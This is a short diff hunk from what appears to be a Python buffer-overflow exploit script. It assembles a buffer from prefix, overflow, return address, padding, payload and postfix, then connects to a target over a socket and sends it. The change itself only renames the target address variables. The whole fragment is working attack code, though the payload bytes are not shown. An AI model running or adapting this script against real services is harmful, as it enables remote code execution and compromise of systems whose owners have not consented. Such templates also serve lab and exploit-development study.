@@ -18,7 +18,7 @@ buffer = prefix + overflow + retn + padding + payload + postfix
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-  s.connect((ip, port))
+  s.connect((IP, PORT))
   print("Sending payload . . .")
   s.send(bytes(buffer + "\r\n", "latin-1"))
   print("Done!")
